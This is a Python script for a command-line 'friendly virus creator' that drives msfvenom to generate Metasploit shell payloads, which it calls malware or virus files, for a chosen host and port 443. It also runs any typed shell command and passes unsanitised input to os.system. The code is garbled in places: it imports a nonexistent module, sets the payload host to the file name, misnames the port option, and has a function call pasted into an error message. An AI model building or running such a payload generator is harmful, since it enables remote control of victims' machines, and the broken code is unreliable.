import ipaddress
from termcolor import cprint, colored
import os
import subprodup
import socket
import numbers
import subprocess
from logo import showlogo
import random


cprint("Please wait.... Loading all components","green",attrs=["bold"])
p = subprodup.check_output("msfvenom --list payloads", shell=True)
f = subprodup.check_output("msfvenom --list formats", shell=True)
pl = subprodup.check_output("msfvenom --list platforms", shell=True)
ar = subprodup.check_output("msfvenom --list archs", shell=True)
platformList = pl.decode("utf-8")
archList = ar.decode("utf-8")
formatList = f.decode("utf-8")
payloadList = p.decode("utf-8")
def start():
    cprint("please wait.....", "green", attrs=["bold"])
    cprint("starting friendly virus creator....", "green", attrs=["bold"])
    cprint("started friendly virus creator", "green")
    showlogo.showIntroLogo()
    cprint("type 'help' to print a help message", "green", attrs=["bold"])
    while True:
        showInput()


def showInput():
    platformPayload = input(colored("payload>>  ", "cyan"))
    if platformPayload == "lsp":
        print(payloadList)
    elif platformPayload == "show-ip":
        cprint(f"Your ip address is: '{socket.gethostbyname(socket.gethostname())}'")
    elif platformPayload == "enter-bash":
        bash()
    elif platformPayload == "lsf":
        print(formatList)
    elif platformPayload == "help":
        cprint(
            "                                                                   Available Commands                                                                               ",
            "green", None, attrs=["underline"])
        cprint("""
      enter-bash    to enter bash command line where you can type bash commands            
      lsp           list all payloads
      show-ip       shows your ip-address
      help          shows this message

      How to create a payload?
          first to create payload type 'lsp' command so you can see a list of payloads
          then copy the payload you need to make
          then paste the copied payload eg:  windows/x64/shell/bind_ipv6_tcp
          then type your ip address if you don't know your ip address you can type 'show-ip' command so you can see your ip-address
          then type the name you want to give to your malware file OR file infected with this payload and The current format is exe file
          So you can't make for linux Sorry.... 
                """, "green", attrs=["bold"])
    elif platformPayload in payloadList:
        cprint("      Type my-ip to automatically check your ip address and submit the ip address", "green", None,
               attrs=["bold"])
        ipaddressU = input(colored("Please type the ipaddress>> ", "cyan"))
        if ipaddressU != "my-ip":
            name = input(colored("name of the file you need to name your virus>>", "cyan"))
            formatPayload = input(colored("please type your format>>", "cyan"))
            if formatPayload in formatList:
                os.system(
                    f"msfvenom -p {platformPayload} LHOST={name} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                makedirandmovefile(name,formatPayload)
            else:
                cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
                while formatPayload not in formatList:

                    formatPayload = input(colored("please type your format>>", "cyan"))
                    if formatPayload in formatList:
                        name = input(colored("name of the file you need to name your virus>>", "cyan"))
                        os.system(
                            f"msfvenom -p {platformPayload} LHOST={name} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                        makedirandmovefile(name, formatPayload)
                    else:
                        cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
        else:
            cprint(f"Your ip will be {socket.gethostbyname(socket.gethostname())}", "green")
            formatPayload = input(colored("please type your format>>", "cyan"))
            if formatPayload in formatList:
                name = input(colored("name of the file you need to name your virus>>", "cyan"))
                os.system(
                    f"msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                makedirandmovefile(name,formatPayload)
            else:
                if formatPayload=="lsf":
                    print(formatList)
                else:
                    cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
                while formatPayload not in formatList:

                    formatPayload = input(colored("please type your format>>", "cyan"))
                    if formatPayload in formatList:
                        name = input(colored("name of the file you need to name your virus>>", "cyan"))
                        os.system(
                            f"msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                        makedirandmovefile(name,formatPayload)
                    else:
                        cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
    else:
        cprint("Unknown command or payload please type lsp to makedirandmovefile(name,formatPayload)list all payloads", "red", None, attrs=["bold"])


def bash():
    cprint("Type 'exit-bash' command to exit", "green", None, attrs=["bold"])
    bash = input(colored(">> ", "cyan"))
    if bash != "exit-bash":
        output = subprodup.check_output(bash, shell=True)
        if ": not found" in output.decode("utf-8"):
            print("Invalid Command")
        else:
            print(output.decode("utf-8"))
        if bash != "exit-bash":
            bash = input(colored(">> ", "cyan"))
            while bash != "exit-bash":
                bash = input(colored(">> ", "cyan"))
                output = subprodup.check_output(bash, shell=True)
                if ": not found" in output.decode("utf-8"):
                    print("Invalid Command")
                elif bash != "exit-bash":
                    print(output.decode("utf-8"))
def showplatform():
    platformInput = input("type the platform to use>>")
    if platformInput =="lspl":
        print(platformList)
    else:
        if platformInput not in platformList:
            cprint("Invalid platform type 'lspl' to list platforms")
            while platformInput not in platformList:
                if platformInput=="lspl":
                    print(platformList)
                platformInput = input("type the virus platform>>")
                if platformInput not in platformList:
                    if platformInput == "lspl":
                        print(platformList)
                    else:
                        if platformInput=="lspl":
                            print(platformList)
                        else:
                            cprint("Invalid platform type 'lspl' to list platforms")
                            platformInput = input("type the virus platform>>")
def makedirandmovefile(nameofFile,formatType):
    cprint("""
    Where do you want to move the file to existing folder or create new folder
    
    1) I want to move to a existing folder
    2) I want to create a new folder and move the file
    
    ""","green",attrs=["bold"])
    confirmToExistingOrNew = input(colored("number>>","cyan"))
    if confirmToExistingOrNew=="2":
        cprint("Type the path you need to move the file first type the path and press ENTER then type the folder name you need to create","green",attrs=["bold"])
        path = input(colored("path>> ","cyan"))
        nameoffolder = input(colored("folder-name>> ","cyan"))
        os.mkdir(os.path.join(path,nameoffolder))
        createdPath = path+"/"+nameoffolder
        nameofFileMixed = nameofFile+"."+formatType
        os.system(f"mv {nameofFileMixed} {createdPath}")
    elif confirmToExistingOrNew =="1":
        existingPath = input(colored("path>> ","cyan"))
        nameofFileMixed = nameofFile + "." + formatType
        os.system(f"mv {nameofFileMixed} {existingPath}")
    else:
        cprint("Invalid Command", "red", attrs=["bold"])
        while confirmToExistingOrNew!="1" and confirmToExistingOrNew!="2":
            cprint("""
            Where do you want to move the file to existing folder or create new folder

            1) I want to move to a existing folder
            2) I want to create a new folder and move the file

            """, "green", attrs=["bold"])
            confirmToExistingOrNew = input(colored("number>>", "cyan"))
            if confirmToExistingOrNew == "2":
                cprint(
                    "Type the path you need to move the file first type the path and press ENTER then type the folder name you need to create",
                    "green", attrs=["bold"])
                path = input(colored("path>> ", "cyan"))
                nameoffolder = input(colored("folder-name>> ", "cyan"))
                os.mkdir(path)
                createdPath = path + "/" + nameoffolder
                nameofFileMixed = nameofFile + "." + formatType
                os.system(f"mv {nameofFileMixed} {createdPath}")
            elif confirmToExistingOrNew == "1":
                existingPath = input(colored("path>> ", "cyan"))
                nameofFileMixed = nameofFile + "." + formatType
                os.system(f"mv {nameofFileMixed} {existingPath}")
            else:
                cprint("Invalid Command","red",attrs=["bold"])

